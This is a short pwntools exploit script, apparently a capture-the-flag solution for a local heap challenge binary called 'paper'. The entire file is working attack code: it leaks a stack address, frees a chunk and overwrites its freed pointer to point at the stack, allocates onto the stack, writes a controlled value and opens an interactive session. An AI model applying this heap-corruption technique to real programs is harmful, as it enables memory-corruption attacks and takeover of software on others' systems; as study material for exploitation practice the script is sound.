from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']


p = process("./paper")


def add():
    p.sendafter('choice > ','1 ')

def dele(a1):
    p.sendafter('choice > ','2 ')
    p.sendlineafter('Index:\n',str(a1))

def edit(a1,a2):
    p.sendafter('choice > ','3 ')
    p.sendafter('Index:\n',str(a1)+' ')
    p.sendafter('word count:\n',str(a2)+' ')

def move(a1):
    p.sendafter('choice > ','5 ')
    p.sendlineafter('Which disk?\n',str(a1))

p.sendafter('choice > ','4 ')
p.recvuntil('at: ')
stack = int(p.recv(14),16)
log.info("stack:"+hex(stack))

add()#0
add()#1
dele(0)

move(0x21)

edit(0,stack-8)
add()#2
add()#3
edit(3,3435973836)
p.sendafter('choice > ','6 ')
p.interactive()

# gdb.attach(p)



p.interactive()